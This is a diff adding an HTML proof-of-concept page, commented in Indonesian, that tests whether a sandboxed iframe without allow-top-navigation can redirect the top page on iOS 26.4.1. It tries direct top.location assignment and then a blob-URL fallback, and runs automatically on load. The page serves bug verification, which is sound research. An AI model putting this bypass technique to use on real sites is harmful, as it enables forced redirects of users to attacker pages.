@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head><title>Sandbox Bypass - iOS 26.4.1</title></head>
+<body style="font-family:sans-serif; padding:20px;">
+<h2>Test Iframe Sandbox Bypass - iOS 26.4.1</h2>
+<p>Ini sandbox TANPA allow-top-navigation, seharusnya TIDAK bisa redirect top page.</p>
+<p>Kalau top page ke-redirect ke evil.com = BUG VALID!</p>
+
+<iframe id="test" sandbox="allow-scripts" style="width:100%; height:200px; border:2px solid red;" srcdoc="
+  <h3>Inside Sandbox</h3>
+  <button onclick='tryBypass()' style='padding:15px;'>CLICK TO TRY BYPASS</button>
+  <script>
+    function tryBypass(){
+      try{
+        // Seharusnya BLOCKED karena sandbox tanpa allow-top-navigation
+        top.location = 'https://0x403for.github.io/sandbox-success.html';
+      }catch(e){
+        // Coba bypass via blob
+        try{
+          let b = new Blob(['<script>top.location=&quot;https://0x403for.github.io/sandbox-success.html&quot;<\/script>'], {type:'text/html'});
+          let u = URL.createObjectURL(b);
+          top.location = u;
+        }catch(e2){
+          parent.postMessage('BLOCKED: '+e2.message, '*');
+        }
+      }
+    }
+    // Auto try
+    setTimeout(tryBypass, 1000);
+  </script>
+"></iframe>
+
+<pre id="log" style="background:#eee; padding:10px; margin-top:20px;">Belum test - tunggu 2 detik...</pre>
+
+<script>
+window.addEventListener('message', e=>{
+  document.getElementById('log').innerText = 'Message dari iframe: '+e.data+'\nJika BLOCKED = SAFE (sudah di-patch)\nJika redirect = BYPASS BUG VALID!';
+});
+setTimeout(()=>{
+  document.getElementById('log').innerText += '\nJika halaman ini TIDAK ke-redirect setelah 3 detik = SAFE\nJika ke-redirect ke sandbox-success.html = BUG!';
+}, 3000);
+</script>
+
+</body>
+</html>
